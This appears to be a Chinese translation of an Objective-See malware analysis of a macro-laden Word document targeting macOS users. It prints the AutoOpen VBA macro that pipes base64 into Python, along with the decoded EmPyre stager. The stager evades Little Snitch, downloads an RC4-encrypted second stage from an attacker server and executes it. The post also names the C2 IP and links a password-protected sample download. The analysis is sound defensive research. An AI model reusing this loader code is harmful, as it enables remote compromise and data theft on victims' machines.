> 原文链接: https://www.anquanke.com//post/id/85478 


# 【技术分享】针对Mac用户的恶意Word文档分析


                                阅读量   
                                **91830**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：objective-see.com
                                <br>原文地址：[https://objective-see.com/blog/blog_0x17.html](https://objective-see.com/blog/blog_0x17.html)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p1.ssl.qhimg.com/t01390ae117795bce16.jpg)](https://p1.ssl.qhimg.com/t01390ae117795bce16.jpg)**

****

翻译：[胖胖秦](http://bobao.360.cn/member/contribute?uid=353915284)

预估稿费：110RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



**简介**

今天发现了很多MacOS上的恶意软件！首先NEX（@botherder）发布了一个很棒的writeup,[iKittens: iranian actor resurfaces with malware for mac (macdownloader) ](https://iranthreats.github.io/resources/macdownloader-macos-malware/)，里面详细介绍了一些新型的MacOS的恶意软件。不久之后，我的朋友Scott（@ 0xdabbad00）提醒我注意以下推特： 

[![](https://p0.ssl.qhimg.com/t019d0a07d6dbfa54a3.jpg)](https://p0.ssl.qhimg.com/t019d0a07d6dbfa54a3.jpg)

我很好奇,这是一个针对Mac用户的恶意Word文档,我取得了样本（"U.S. Allies and Rivals Digest Trump鈥檚 Victory – Carnegie Endowment for International Peace.docm"），并注意到，只有4 个AV引擎将它标记为恶意： 

[![](https://p5.ssl.qhimg.com/t01ca33c1489437ff64.jpg)](https://p5.ssl.qhimg.com/t01ca33c1489437ff64.jpg)

如果你想一起分析请务必小心，我上传恶意文档,你可以[在这里](https://objective-see.com/downloads/malware/DocFromRU.zip)找到它（密码：infect3d）。

可以很容易地确认，该文件是一个Microsoft Word文档：



```
$ file "U.S. Allies and Rivals Digest Trump鈥檚 Victory - Carnegie Endowment for International Peace.docm"
Microsoft Word 2007+
```

当你试图用Word打开该文档时（一个隔离的MacOS虚拟机内）会触发一个警告:“此文件包含宏”的警告： 

[![](https://p2.ssl.qhimg.com/t01f47e97e7e4972a23.jpg)](https://p2.ssl.qhimg.com/t01f47e97e7e4972a23.jpg)

<br>

**分析 **

让我们提取嵌入的宏来分析文档中的恶意逻辑。我们可以使用的ClamAV的sigtool提取嵌入的宏。

首先，如在线帮助所说的，如今的Word文件实际上是“存储在Zip文件的XML文件”以及“VBA宏通常存储在Zip压缩文件内的二进制OLE文件，名为vbaProject.bin。 所以，先解压（'unzip'）文档： 



```
$ unzip "U.S. Allies and Rivals Digest Trump鈥檚 Victory - Carnegie Endowment for International Peace.docm"
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: word/_rels/document.xml.rels
  inflating: word/document.xml
  inflating: word/theme/theme1.xml
  inflating: word/vbaProject.bin
  inflating: word/_rels/vbaProject.bin.rels
  inflating: word/vbaData.xml
  inflating: word/settings.xml
  inflating: word/stylesWithEffects.xml
  inflating: word/styles.xml
  inflating: docProps/core.xml
  inflating: word/fontTable.xml
  inflating: word/webSettings.xml
  inflating: docProps/app.xml
```

然后将word/vbaProject.bin文件传递给sigtool命令，并使用–vba标志提取嵌入的宏：



```
$sigtool --vba word/vbaProject.bin 
-------------- start of code ------------------
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
...
Sub autoopen()
Fisher
End Sub
....
Public Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
Public Sub Fisher()
Dim result As Long
Dim cmd As String
cmd = "ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBvcnQgc3"
cmd = cmd + "NsOwppZiBoYXNhdHRyKHNzbCwgJ19jcmVhdGVfdW52ZXJpZm"
cmd = cmd + "llZF9jb250ZXh0Jyk6c3NsLl9jcmVhdGVfZGVmYXVsdF9odH"
cmd = cmd + "Rwc19jb250ZXh0ID0gc3NsLl9jcmVhdGVfdW52ZXJpZmllZF"
cmd = cmd + "9jb250ZXh0OwppbXBvcnQgc3lzLCB1cmxsaWIyO2ltcG9ydC"
....
cmd = cmd + "BlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl"
cmd = cmd + "0pKQpleGVjKCcnLmpvaW4ob3V0KSk="
result = system("echo ""import sys,base64;exec(base64.b64decode("" " &amp; cmd &amp; " ""));"" | python &amp;")
End Sub
```

根据微软所说的，“当打开一个新文档时,AutoOpen宏会开始运行”。 因此，只要用户打开Mac上的这个文件，在Word中（假定已启用宏）,Fisher函数就会自动执行。 

Fisher函数对数据进行base64解码（保存在CMD变量），然后通过Python执行它。使用Python的base64模块，我们可以轻松解码的数据：



```
$ python
&gt;&gt;&gt; import base64
&gt;&gt;&gt; cmd = "ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBv .... "
&gt;&gt;&gt; base64.b64decode(cmd)
...
dXFprvsgMBSIyPf = 'atfMzZOqVLbcj'
import ssl;
if hasattr(ssl, '_create_unverified_context'): 
   ssl._create_default_https_context = ssl._create_unverified_context;
import sys, urllib2;
import re, subprocess;
cmd = "ps -ef | grep Little Snitch | grep -v grep"
ps = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE)
out = ps.stdout.read()
ps.stdout.close()
if re.search("Little Snitch", out):
   sys.exit()
o = __import__(`{`
   2: 'urllib2',
   3: 'urllib.request'
`}`[sys.version_info[0]], fromlist = ['build_opener']).build_opener();
UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0';
o.addheaders = [('User-Agent', UA)];
a = o.open('https://www.securitychecking.org:443/index.asp').read();
key = 'fff96aed07cb7ea65e7f031bd714607d';
S, j, out = range(256), 0, []
for i in range(256):
   j = (j + S[i] + ord(key[i % len(key)])) % 256
   S[i], S[j] = S[j], S[i]
i = j = 0
for char in a:
   i = (i + 1) % 256
   j = (j + S[i]) % 256
   S[i], S[j] = S[j], S[i]
   out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
exec(''.join(out))
```

Python代码！宏中包含的已解码的python很容易阅读。简而言之：

1.	检查以确保LittleSnitch没有运行

2.	从[https://www.securitychecking.org:443/index.asp](https://www.securitychecking.org:443/index.asp)  上下载第二级的攻击载荷

3.	使用RC4解密这个有效载荷（key：fff96aed07cb7ea65e7f031bd714607d）

4.	执行这个已解密的攻击载荷

python代码看起来很熟悉吗？是! 它几乎和开源的EmPyre一模一样。特别是lib/common/stagers.py文件：

[![](https://p5.ssl.qhimg.com/t01ed769398655eafc0.jpg)](https://p5.ssl.qhimg.com/t01ed769398655eafc0.jpg)

EmPyre是一个“基于密码学安全通信上的纯Python开发后利用代理和灵活的框架” 好的，所以攻击者正在使用开源的多阶段后利用代理。

 如上所述，第一级的Python代码的目标是要下载和执行第二阶段组件,它从[https://www.securitychecking.org:443/index.asp](https://www.securitychecking.org:443/index.asp)  上下载。很抱歉，此文件现在无法访问。然而，这个文件可能只是Empyre的第二阶段组件（虽然攻击者可以下载并执行其他东西）。 Empyre的第二阶段组件是持久代理，它使远程攻击者能够继续访问受感染的主机。它如何持久化的呢？它是可配置的：



```
(EmPyre) &gt; usemodule persistence
mutli/crontab   osx/CreateHijacker   osx/launchdaemonexecutable   osx/loginhook
```

所以持久化可能通过以下方式实现：

cronjob

dylib劫持

启动守护程序

登录hook

我不会说谎，我相当失望地看到Empyre（包含cite）的dylib劫持技术–我在几年前在VirusBulletin就详细分析过了。



```
CreateHijacker.py
# list of any references/other comments
   'Comments': [
   'comment',
   'https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x'
   ]
... 
adapted from @patrickwardle's script
```

如果恶意软件的第二阶段组件作为一个cronjob或守护进程来实现持久化，BlockBlock会尝试检测持久化： 

[![](https://p4.ssl.qhimg.com/t01884863c433201c0d.png)](https://p4.ssl.qhimg.com/t01884863c433201c0d.png)

我很可能会更新BlockBlock来监视login items持久化，尽管这是一个非常古老和不赞成使用的持久性技术。KnockKnock和Dylib劫持扫描器都能够发现持久化组件。 

EmPyre的持久性组件还可以被配置来运行多种EmPyre模块（如：[lib/modules/collection/osx](https://github.com/EmpireProject/EmPyre/tree/master/lib/modules/collection/osx)）。这些模块允许攻击者执行恶意操作，如启用摄像头，dump钥匙链，以及访问用户的浏览器历史： 

[![](https://p3.ssl.qhimg.com/t01f9bb7b8b15c42228.png)](https://p3.ssl.qhimg.com/t01f9bb7b8b15c42228.png)

好吧，关于[www.securitychecking.org](http://www.securitychecking.org)  网站有什么呢？正如@noar指出的，VirusTotal扫描之前的网站，它解析为185.22.174.37：

[![](https://p0.ssl.qhimg.com/t0159affa35b8b76be0.png)](https://p0.ssl.qhimg.com/t0159affa35b8b76be0.png)

 此IP位于俄罗斯,并与多起恶意行为有关，如钓鱼网站： 

[![](https://p3.ssl.qhimg.com/t0197713f40c8fede6e.png)](https://p3.ssl.qhimg.com/t0197713f40c8fede6e.png)

<br>

**结论 **

总体来说，这一恶意软件样本不是特别先进。它依赖于用户交互（在Microsoft Word中打开恶意文档（而不是Apple的页面）），以及需要启用宏。大多数用户知道从不允许宏！此外，使用开源的组件可能会导致检测软件检测到它！

由于宏是“合法的”功能（相对于内存崩溃漏洞），恶意软件也不必担心在系统中崩溃或被修补。 
